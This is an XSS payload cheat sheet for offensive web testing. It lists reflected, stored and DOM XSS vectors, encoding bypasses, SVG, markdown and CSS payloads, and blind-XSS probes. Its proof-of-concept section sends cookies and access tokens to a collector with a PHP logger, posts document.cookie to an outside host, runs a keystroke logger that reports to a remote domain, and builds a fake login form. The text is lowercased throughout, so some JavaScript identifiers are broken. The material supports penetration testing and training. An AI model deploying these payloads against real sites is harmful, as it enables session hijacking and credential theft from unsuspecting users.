# cross site scripting

> cross-site scripting (xss) is a type of computer security vulnerability typically found in web applications. xss enables attackers to inject client-side scripts into web pages viewed by other users.


## summary

- [methodology](#methodology)
- [proof of concept](#proof-of-concept)
    - [data grabber](#data-grabber)
    - [cors](#cors)
    - [ui redressing](#ui-redressing)
    - [javascript keylogger](#javascript-keylogger)
    - [other ways](#other-ways)
- [identify an xss endpoint](#identify-an-xss-endpoint)
    - [tools](#tools)
- [xss in html/applications](#xss-in-htmlapplications)
    - [common payloads](#common-payloads)
    - [xss using html5 tags](#xss-using-html5-tags)
    - [xss using a remote js](#xss-using-a-remote-js)
    - [xss in hidden input](#xss-in-hidden-input)
    - [xss in uppercase output](#xss-in-uppercase-output)
    - [dom based xss](#dom-based-xss)
    - [xss in js context](#xss-in-js-context)
- [xss in wrappers for uri](#xss-in-wrappers-for-uri)
    - [wrapper javascript:](#wrapper-javascript)
    - [wrapper data:](#wrapper-data)
    - [wrapper vbscript:](#wrapper-vbscript)
- [xss in files](#xss-in-files)
    - [xss in xml](#xss-in-xml)
    - [xss in svg](#xss-in-svg)
    - [xss in markdown](#xss-in-markdown)
    - [xss in css](#xss-in-css)
- [xss in postmessage](#xss-in-postmessage)
- [blind xss](#blind-xss)
    - [xss hunter](#xss-hunter)
    - [other blind xss tools](#other-blind-xss-tools)
    - [blind xss endpoint](#blind-xss-endpoint)
    - [tips](#tips)
- [mutated xss](#mutated-xss)
- [labs](#labs)
- [references](#references)


## methodology

cross-site scripting (xss) is a type of computer security vulnerability typically found in web applications. xss allows attackers to inject malicious code into a website, which is then executed in the browser of anyone who visits the site. this can allow attackers to steal sensitive information, such as user login credentials, or to perform other malicious actions.

there are 3 main types of xss attacks:

* **reflected xss**: in a reflected xss attack, the malicious code is embedded in a link that is sent to the victim. when the victim clicks on the link, the code is executed in their browser. for example, an attacker could create a link that contains malicious javascript, and send it to the victim in an email. when the victim clicks on the link, the javascript code is executed in their browser, allowing the attacker to perform various actions, such as stealing their login credentials.

* **stored xss**: in a stored xss attack, the malicious code is stored on the server, and is executed every time the vulnerable page is accessed. for example, an attacker could inject malicious code into a comment on a blog post. when other users view the blog post, the malicious code is executed in their browsers, allowing the attacker to perform various actions.

* **dom-based xss**: is a type of xss attack that occurs when a vulnerable web application modifies the dom (document object model) in the user's browser. this can happen, for example, when a user input is used to update the page's html or javascript code in some way. in a dom-based xss attack, the malicious code is not sent to the server, but is instead executed directly in the user's browser. this can make it difficult to detect and prevent these types of attacks, because the server does not have any record of the malicious code.

to prevent xss attacks, it is important to properly validate and sanitize user input. this means ensuring that all input meets the necessary criteria, and removing any potentially dangerous characters or code. it is also important to escape special characters in user input before rendering it in the browser, to prevent the browser from interpreting it as code.


## proof of concept

when exploiting an xss vulnerability, it’s more effective to demonstrate a complete exploitation scenario that could lead to account takeover or sensitive data exfiltration. instead of simply reporting an xss with an alert payload, aim to capture valuable data, such as payment information, personal identifiable information (pii), session cookies, or credentials.


### data grabber

obtains the administrator cookie or sensitive access token, the following payload will send it to a controlled page.

```html
<script>document.location='http://localhost/xss/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/xss/grabber.php?c='+localstorage.getitem('access_token')</script>
<script>new image().src="http://localhost/cookie.php?c="+document.cookie;</script>
<script>new image().src="http://localhost/cookie.php?c="+localstorage.getitem('access_token');</script>
```

write the collected data into a file.

```php
<?php
$cookie = $_get['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'cookie:' .$cookie."\r\n");
fclose($fp);
?>
```

### cors

```html
<script>
  fetch('https://<session>.burpcollaborator.net', {
  method: 'post',
  mode: 'no-cors',
  body: document.cookie
  });
</script>
```

### ui redressing

leverage the xss to modify the html content of the page in order to display a fake login form.

```html
<script>
history.replacestate(null, null, '../../../login');
document.body.innerhtml = "</br></br></br></br></br><h1>please login to continue</h1><form>username: <input type='text'>password: <input type='password'></form><input value='submit' type='submit'>"
</script>
```

### javascript keylogger

another way to collect sensitive data is to set a javascript keylogger.

```javascript
<img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+string.fromcharcode(e.which))},this.remove();'>
```

### other ways

more exploits at [http://www.xss-payloads.com/payloads-list.html?a#category=all](http://www.xss-payloads.com/payloads-list.html?a#category=all):

- [taking screenshots using xss and the html5 canvas](https://www.idontplaydarts.com/2012/04/taking-screenshots-using-xss-and-the-html5-canvas/)
- [javascript port scanner](http://www.gnucitizen.org/blog/javascript-port-scanner/)
- [network scanner](http://www.xss-payloads.com/payloads/scripts/websocketsnetworkscan.js.html)
- [.net shell execution](http://www.xss-payloads.com/payloads/scripts/dotnetexec.js.html)
- [redirect form](http://www.xss-payloads.com/payloads/scripts/redirectform.js.html)
- [play music](http://www.xss-payloads.com/payloads/scripts/playmusic.js.html)


## identify an xss endpoint

this payload opens the debugger in the developer console rather than triggering a popup alert box.

```javascript
<script>debugger;</script>
```

modern applications with content hosting can use [sandbox domains][sandbox-domains]

> to safely host various types of user-generated content. many of these sandboxes are specifically meant to isolate user-uploaded html, javascript, or flash applets and make sure that they can't access any user data.

[sandbox-domains]:https://security.googleblog.com/2012/08/content-hosting-for-modern-web.html

for this reason, it's better to use `alert(document.domain)` or `alert(window.origin)` rather than `alert(1)` as default xss payload in order to know in which scope the xss is actually executing.

better payload replacing `<script>alert(1)</script>`:

```html
<script>alert(document.domain.concat("\n").concat(window.origin))</script>
```

while `alert()` is nice for reflected xss it can quickly become a burden for stored xss because it requires to close the popup for each execution, so `console.log()` can be used instead to display a message in the console of the developer console (doesn't require any interaction).

example:

```html
<script>console.log("test xss from the search bar of page xyz\n".concat(document.domain).concat("\n").concat(window.origin))</script>
```

references:

- [google bughunter university - xss in sandbox domains](https://sites.google.com/site/bughunteruniversity/nonvuln/xss-in-sandbox-domain)
- [liveoverflow video - do not use alert(1) for xss](https://www.youtube.com/watch?v=khwvjzwei1c)
- [liveoverflow blog post - do not use alert(1) for xss](https://liveoverflow.com/do-not-use-alert-1-in-xss/)

### tools 

most tools are also suitable for blind xss attacks:

* [xssstrike](https://github.com/s0md3v/xsstrike): very popular but unfortunately not very well maintained
* [xsser](https://github.com/epsylon/xsser): utilizes a headless browser to detect xss vulnerabilities
* [dalfox](https://github.com/hahwul/dalfox): extensive functionality and extremely fast thanks to the implementation in go
* [xspear](https://github.com/hahwul/xspear): similar to dalfox but based on ruby
* [domdig](https://github.com/fcavallarin/domdig): headless chrome xss tester

## xss in html/applications

### common payloads

```javascript
// basic payload
<script>alert('xss')</script>
<scr<script>ipt>alert('xss')</scr<script>ipt>
"><script>alert('xss')</script>
"><script>alert(string.fromcharcode(88,83,83))</script>
<script>\u0061lert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>eval(8680439..tostring(30))(983801..tostring(36))</script> //parseint("confirm",30) == 8680439 && 8680439..tostring(30) == "confirm"
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">

// img payload
<img src=x onerror=alert('xss');>
<img src=x onerror=alert('xss')//
<img src=x onerror=alert(string.fromcharcode(88,83,83));>
<img src=x oneonerrorrror=alert(string.fromcharcode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('xss');>
"><img src=x onerror=alert(string.fromcharcode(88,83,83));>
<><img src=1 onerror=alert(1)>

// svg payload
<svgonload=alert(1)>
<svg/onload=alert('xss')>
<svg onload=alert(1)//
<svg/onload=alert(string.fromcharcode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(string.fromcharcode(88,83,83))>
"><svg/onload=alert(/xss/)
<svg><script href=data:,alert(1) />(`firefox` is the only browser which allows self closing script)
<svg><script>alert('33')
<svg><script>alert&lpar;'33'&rpar;

// div payload
<div onpointerover="alert(45)">move here</div>
<div onpointerdown="alert(45)">move here</div>
<div onpointerenter="alert(45)">move here</div>
<div onpointerleave="alert(45)">move here</div>
<div onpointermove="alert(45)">move here</div>
<div onpointerout="alert(45)">move here</div>
<div onpointerup="alert(45)">move here</div>
```

### xss using html5 tags

```javascript
<body onload=alert(/xss/.source)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<video src=_ onloadstart="alert(1)">
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>

<body ontouchstart=alert(1)> // triggers when a finger touch the screen
<body ontouchend=alert(1)>   // triggers when a finger is removed from touch screen
<body ontouchmove=alert(1)>  // when a finger is dragged across the screen.
```

### xss using a remote js

```html
<svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
<script src=14.rs>
// you can also specify an arbitrary payload with 14.rs/#payload
e.g: 14.rs/#alert(document.domain)
```

### xss in hidden input

```javascript
<input type="hidden" accesskey="x" onclick="alert(1)">
use ctrl+shift+x to trigger the onclick event
```
in newer browsers : firefox-130/chrome-108
```javascript
<input type="hidden" oncontentvisibilityautostatechange="alert(1)"  style="content-visibility:auto" >
```

### xss in uppercase output

```javascript
<img src=1 onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```

### dom based xss

based on a dom xss sink.

```javascript
#"><img src=/ onerror=alert(2)>
```

### xss in js context

```javascript
-(confirm)(document.domain)//
; alert(1);//
// (payload without quote/double quote from [@brutelogic](https://twitter.com/brutelogic)
```

## xss in wrappers for uri

### wrapper javascript

```javascript
javascript:prompt(1)

%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341

&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41

we can encode the "javascript:" in hex/octal
\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
\152\141\166\141\163\143\162\151\160\164\072alert(1)

we can use a 'newline character'
java%0ascript:alert(1)   - lf (\n)
java%09script:alert(1)   - horizontal tab (\t)
java%0dscript:alert(1)   - cr (\r)

using the escape character
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)

using the newline and a comment //
javascript://%0aalert(1)
javascript://anything%0d%0a%0d%0awindow.alert(1)
```

### wrapper data

```javascript
data:text/html,<script>alert(0)</script>
data:text/html;base64,phn2zy9vbmxvywq9ywxlcnqomik+
<script src="data:;base64,ywxlcnqozg9jdw1lbnquzg9tywlukq=="></script>
```

### wrapper vbscript

only ie

```javascript
vbscript:msgbox("xss")
```

## xss in files

**note:** the xml cdata section is used here so that the javascript payload will not be treated as xml markup.

```xml
<name>
  <value><![cdata[<script>confirm(document.domain)</script>]]></value>
</name>
```

### xss in xml

```xml
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>
</html>
```

### xss in svg

simple script. codename: green triangle

```xml
<?xml version="1.0" standalone="no"?>
<!doctype svg public "-//w3c//dtd svg 1.1//en" "http://www.w3.org/graphics/svg/1.1/dtd/svg11.dtd">

<svg version="1.1" baseprofile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

more comprehensive payload with svg tag attribute, desc script, foreignobject script, foreignobject iframe, title script, animatetransform event and simple script. codename: red ligthning. author: noraj.

```xml
<?xml version="1.0" standalone="no"?>
<!doctype svg public "-//w3c//dtd svg 1.1//en" "http://www.w3.org/graphics/svg/1.1/dtd/svg11.dtd">

<svg version="1.1" baseprofile="full" width="100" height="100" xmlns="http://www.w3.org/2000/svg" onload="alert('svg attribut')">
  <polygon id="lightning" points="0,100 50,25 50,75 100,0" fill="#ff1919" stroke="#ff0000"/>
  <desc><script>alert('svg desc')</script></desc>
  <foreignobject><script>alert('svg foreignobject')</script></foreignobject>
  <foreignobject width="500" height="500">
    <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert('svg foreignobject iframe');" width="400" height="250"/>
  </foreignobject>
  <title><script>alert('svg title')</script></title>
  <animatetransform onbegin="alert('svg animatetransform onbegin')"></animatetransform>
  <script type="text/javascript">
    alert('svg script');
  </script>
</svg>
```



#### short svg payload

```javascript
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>

<svg><desc><![cdata[</desc><script>alert(1)</script>]]></svg>
<svg><foreignobject><![cdata[</foreignobject><script>alert(2)</script>]]></svg>
<svg><title><![cdata[</title><script>alert(3)</script>]]></svg>
```

### nesting svg and xss

including a remote svg image in a svg works but won't trigger the xss embedded in the remote svg. author: noraj.

svg 1.x (xlink:href)

```xml
<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://127.0.0.1:9999/red_lightning_xss_full.svg" height="200" width="200"/>
</svg>
```

including a remote svg fragment in a svg works but won't trigger the xss embedded in the remote svg element because it's impossible to add vulnerable attribute on a polygon/rect/etc since the `style` attribute is no longer a vector on modern browsers. author: noraj.

svg 1.x (xlink:href)

```xml
<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <use xlink:href="http://127.0.0.1:9999/red_lightning_xss_full.svg#lightning"/>
</svg>
```

however, including svg tags in svg documents works and allows xss execution from sub-svgs. codename: french flag. author: noraj.

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <svg x="10">
    <rect x="10" y="10" height="100" width="100" style="fill: #002654"/>
    <script type="text/javascript">alert('sub-svg 1');</script>
  </svg>
  <svg x="200">
    <rect x="10" y="10" height="100" width="100" style="fill: #ed2939"/>
    <script type="text/javascript">alert('sub-svg 2');</script>
  </svg>
</svg>
```

### xss in markdown

```csharp
[a](javascript:prompt(document.cookie))
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,phnjcmlwdd5hbgvydcgnwfntjyk8l3njcmlwdd4k)
[a](javascript:window.onerror=alert;throw%201)
```

### xss in css

```html
<!doctype html>
<html>
<head>
<style>
div  {
    background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
    background-color: #cccccc;
}
</style>
</head>
  <body>
    <div>lol</div>
  </body>
</html>
```

## xss in postmessage

> if the target origin is asterisk * the message can be sent to any domain has reference to the child page.

```html
<html>
<body>
    <input type=button value="click me" id="btn">
</body>

<script>
document.getelementbyid('btn').onclick = function(e){
    window.poc = window.open('http://www.redacted.com/#login');
    settimeout(function(){
        window.poc.postmessage(
            {
                "sender": "accounts",
                "url": "javascript:confirm('xss')",
            },
            '*'
        );
    }, 2000);
}
</script>
</html>
```

## blind xss

### xss hunter

> xss hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind xss. the service works by hosting specialized xss probes which, upon firing, scan the page and send information about the vulnerable page to the xss hunter service.

xss hunter is deprecated, it was available at [https://xsshunter.com/app](https://xsshunter.com/app). 

you can set up an alternative version 

* self-hosted version from [mandatoryprogrammer/xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)
* hosted on [xsshunter.trufflesecurity.com](https://xsshunter.trufflesecurity.com/)

```xml
"><script src="https://js.rip/<custom.name>"></script>
"><script src=//<custom.subdomain>.xss.ht></script>
<script>$.getscript("//<custom.subdomain>.xss.ht")</script>
```

### other blind xss tools

- [netflix-skunkworks/sleepy-puppy](https://github.com/netflix-skunkworks/sleepy-puppy) - sleepy puppy xss payload management framework
- [lewisardern/bxss](https://github.com/lewisardern/bxss) - bxss is a utility which can be used by bug hunters and organizations to identify blind cross-site scripting. 
- [ssl/ezxss](https://github.com/ssl/ezxss) - ezxss is an easy way for penetration testers and bug bounty hunters to test (blind) cross site scripting. 

### blind xss endpoint

- contact forms
- ticket support
- referer header
  - custom site analytics
  - administrative panel logs
- user agent
  - custom site analytics
  - administrative panel logs
- comment box
  - administrative panel

### tips

you can use a [data grabber for xss](#data-grabber-for-xss) and a one-line http server to confirm the existence of a blind xss before deploying a heavy blind-xss testing tool.

eg. payload

```html
<script>document.location='http://10.10.14.30:8080/xss/grabber.php?c='+document.domain</script>
```

eg. one-line http server:

```ps1
$ ruby -run -ehttpd . -p8080
```

## mutated xss

use browsers quirks to recreate some html tags.

**example**: mutated xss from masato kinugawa, used against [cure53/dompurify](https://github.com/cure53/dompurify) component on google search. 

```javascript
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

technical blogposts available at

* https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/
* https://research.securitum.com/dompurify-bypass-using-mxss/


## labs

* [portswigger labs for xss](https://portswigger.net/web-security/all-labs#cross-site-scripting)
* [root me - xss - reflected](https://www.root-me.org/en/challenges/web-client/xss-reflected)
* [root me - xss - server side](https://www.root-me.org/en/challenges/web-server/xss-server-side)
* [root me - xss - stored 1](https://www.root-me.org/en/challenges/web-client/xss-stored-1)
* [root me - xss - stored 2](https://www.root-me.org/en/challenges/web-client/xss-stored-2)
* [root me - xss - stored - filter bypass](https://www.root-me.org/en/challenges/web-client/xss-stored-filter-bypass)
* [root me - xss dom based - introduction](https://www.root-me.org/en/challenges/web-client/xss-dom-based-introduction)
* [root me - xss dom based - angularjs](https://www.root-me.org/en/challenges/web-client/xss-dom-based-angularjs)
* [root me - xss dom based - eval](https://www.root-me.org/en/challenges/web-client/xss-dom-based-eval)
* [root me - xss dom based - filters bypass](https://www.root-me.org/en/challenges/web-client/xss-dom-based-filters-bypass)
* [root me - xss - dom based](https://www.root-me.org/en/challenges/web-client/xss-dom-based)
* [root me - self xss - dom secrets](https://www.root-me.org/en/challenges/web-client/self-xss-dom-secrets)
* [root me - self xss - race condition](https://www.root-me.org/en/challenges/web-client/self-xss-race-condition)


## references

- [abusing xss filter: one ^ leads to xss(cve-2016-3212) - masato kinugawa's (@kinugawamasato) - july 15, 2016](http://mksben.l0.cm/2016/07/xxn-caret.html)
- [account recovery xss - gábor molnár - april 13, 2016](https://sites.google.com/site/bughunteruniversity/best-reports/account-recovery-xss)
- [an xss on facebook via pngs & wonky content types - jack whitton (@fin1te) - january 27, 2016](https://whitton.io/articles/xss-on-facebook-via-png-content-types/)
- [bypassing signature-based xss filters: modifying script code - portswigger - august 4, 2020](https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-script-code)
- [combination of techniques lead to dom based xss in google - sasi levi - september 19, 2016](http://sasi2103.blogspot.sg/2016/09/combination-of-techniques-lead-to-dom.html)
- [cross-site scripting (xss) cheat sheet - portswigger - september 27, 2019](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [encoding differentials: why charset matters - stefan schiller - july 15, 2024](https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/)
- [facebook's moves - oauth xss - paulos yibelo - december 10, 2015](http://www.paulosyibelo.com/2015/12/facebooks-moves-oauth-xss.html)
- [frans rosén on how he got bug bounty for mega.co.nz xss - frans rosén - february 14, 2013](https://labs.detectify.com/2013/02/14/how-i-got-the-bug-bounty-for-mega-co-nz-xss/)
- [google xss turkey - frans rosén - june 6, 2015](https://labs.detectify.com/2015/06/06/google-xss-turkey/)
- [how i found a $5,000 google maps xss (by fiddling with protobuf) - marin moulinier - march 9, 2017](https://medium.com/@marin_m/how-i-found-a-5-000-google-maps-xss-by-fiddling-with-protobuf-963ee0d9caff#.cktt61q9g)
- [killing a bounty program, twice - itzhak (zuk) avraham and nir goldshlager - may 2012](http://conference.hitb.org/hitbsecconf2012ams/materials/d1t2%20-%20itzhak%20zuk%20avraham%20and%20nir%20goldshlager%20-%20killing%20a%20bug%20bounty%20program%20-%20twice.pdf)
- [mxss attacks: attacking well-secured web-applications by using innerhtml mutations - mario heiderich, jörg schwenk, tilman frosch, jonas magazinius, edward z. yang - september 26, 2013](https://cure53.de/fp170.pdf)
- [postmessage xss on a million sites - mathias karlsson - december 15, 2016](https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/)
- [rpo that lead to information leakage in google - @filedescriptor - july 3, 2016](https://web.archive.org/web/20220521125028/https://blog.innerht.ml/rpo-gadgets/)
- [secret web hacking knowledge: ctf authors hate these simple tricks - philippe dourassov - may 13, 2024](https://youtu.be/sm4g6cahjwm)
- [stealing contact form data on www.hackerone.com using marketo forms xss with postmessage frame-jumping and jquery-jsonp - frans rosén (fransrosen) - february 17, 2017](https://hackerone.com/reports/207042)
- [stored xss affecting all fantasy sports [*.fantasysports.yahoo.com] - thedawgyg - december 7, 2016](https://web.archive.org/web/20161228182923/http://dawgyg.com/2016/12/07/stored-xss-affecting-all-fantasy-sports-fantasysports-yahoo-com-2/)
- [stored xss in *.ebay.com - jack whitton (@fin1te) - january 27, 2013](https://whitton.io/archive/persistent-xss-on-myworld-ebay-com/)
- [stored xss in facebook chat, check in, facebook messenger - nirgoldshlager - april 17, 2013](http://web.archive.org/web/20130420095223/http://www.breaksec.com/?p=6129)
- [stored xss on developer.uber.com via admin account compromise in uber - james kettle (@albinowax) - july 18, 2016](https://hackerone.com/reports/152067)
- [stored xss on snapchat - mrityunjoy - february 9, 2018](https://medium.com/@mrityunjoy/stored-xss-on-snapchat-5d704131d8fd)
- [stored xss, and ssrf in google using the dataset publishing language - craig arendt - march 7, 2018](https://s1gnalcha0s.github.io/dspl/2018/03/07/stored-xss-and-ssrf-google.html)
- [tricky html injection and possible xss in sms-be-vip.twitter.com - ahmed aboul-ela (@aboul3la) - july 9, 2016](https://hackerone.com/reports/150179)
- [twitter xss by stopping redirection and javascript scheme - sergey bobrov (bobrov) - september 30, 2017](https://hackerone.com/reports/260744)
- [uber bug bounty: turning self-xss into good xss - jack whitton (@fin1te) - march 22, 2016](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/)
- [uber self xss to global xss - httpsonly - august 29, 2016](https://httpsonly.blogspot.hk/2016/08/turning-self-xss-into-good-xss-v2.html)
- [unleashing an ultimate xss polyglot - ahmed elsobky - february 16, 2018](https://github.com/0xsobky/hackvault/wiki/unleashing-an-ultimate-xss-polyglot)
- [using a braun shaver to bypass xss audit and waf - frans rosen - april 19, 2016](http://web.archive.org/web/20160810033728/https://blog.bugcrowd.com/guest-blog-using-a-braun-shaver-to-bypass-xss-audit-and-waf-by-frans-rosen-detectify)
- [ways to alert(document.domain) - tom hudson (@tomnomnom) - february 22, 2018](https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309)
- [xss by tossing cookies - wesecureapp - july 10, 2017](https://wesecureapp.com/blog/xss-by-tossing-cookies/)
- [xss ghettobypass - d3adend - september 25, 2015](http://d3adend.org/xss/ghettobypass)
- [xss in uber via cookie - zhchbin - august 30, 2017](http://zhchbin.github.io/2017/08/30/uber-xss-via-cookie/)
- [xss on any shopify shop via abuse of the html5 structured clone algorithm in postmessage listener - luke young (bored-engineer) - may 23, 2017](https://hackerone.com/reports/231053)
- [xss via host header - www.google.com/cse - michał bentkowski - april 22, 2015](http://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html)
- [xssing web with unicodes - rakesh mane - august 3, 2017](http://blog.rakeshmane.com/2017/08/xssing-web-part-2.html)
- [yahoo mail stored xss - jouko pynnönen - january 19, 2016](https://klikki.fi/adv/yahoo.html)
- [yahoo mail stored xss #2 - jouko pynnönen - december 8, 2016](https://klikki.fi/adv/yahoo2.html)